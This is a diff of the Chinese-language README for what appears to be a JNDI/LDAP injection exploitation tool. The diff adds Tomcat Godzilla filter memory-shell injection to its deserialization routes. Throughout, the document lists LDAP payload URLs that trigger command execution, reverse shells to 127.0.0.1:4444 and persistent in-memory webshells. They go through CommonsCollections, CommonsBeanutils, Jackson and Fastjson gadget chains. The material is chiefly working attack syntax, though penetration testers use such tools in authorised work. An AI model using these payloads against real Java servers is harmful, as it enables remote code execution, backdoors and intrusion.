@@ -104,7 +104,7 @@ ldap://127.0.0.1:1389/Basic/Meterpreter/MTI3LjAuMC4x/NDQ0NA==
 
 基于 [MemShellParty](https://github.com/ReaJason/MemShellParty) 项目
 
-目前仅支持通过 Basic/BeanFactory 路由注入内存马
+目前仅支持通过 Basic/BeanFactory/Deserialize 路由注入内存马
 
 ```bash
 # 格式
@@ -470,9 +470,10 @@ ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialize-data>
 ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # 相对于当前路径
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
 
-# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行和反弹 Shell
+# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行, 反弹 Shell, 内存马注入
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/MemShell/Tomcat/Godzilla/Filter
 
 # CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator
@@ -484,31 +485,36 @@ ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculato
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
 
 # CommonsBeanutils 反序列化
-# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行和反弹 Shell
+# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行， 反弹 Shell， 内存马注入
 # 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4
 
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/MemShell/Tomcat/Godzilla/Filter
 
 # 1.9.4
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/Filter
 
 # Jackson 反序列化
 # 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Jackson/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson 反序列化
 
 # Fastjson1: 全版本 (1.2.x)
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
 
 # Fastjson2: <= 2.0.26
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
 ```
 
 ## Script
